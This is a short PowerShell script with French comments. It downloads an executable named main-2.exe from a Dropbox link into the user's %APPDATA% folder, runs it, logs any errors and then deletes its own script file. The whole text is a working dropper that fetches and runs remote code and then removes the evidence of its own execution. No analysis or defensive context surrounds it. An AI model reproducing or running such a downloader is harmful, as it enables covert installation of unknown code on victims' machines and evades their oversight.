# URL du fichier .exe
$url = 'https://www.dropbox.com/scl/fi/8017nmu1kzi31qpn3q1oc/main-2.exe?dl=1'

# Chemin de sortie dans %APPDATA%
$out = "$env:APPDATA\main-2.exe"

# Téléchargement et lancement du .exe
Try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    Start-Process $out
} Catch {
    # Log des erreurs dans error_log.txt
    $_ | Out-File "$env:APPDATA\error_log.txt"
}

# Supprime le script .ps1 après exécution
Remove-Item $MyInvocation.MyCommand.Path
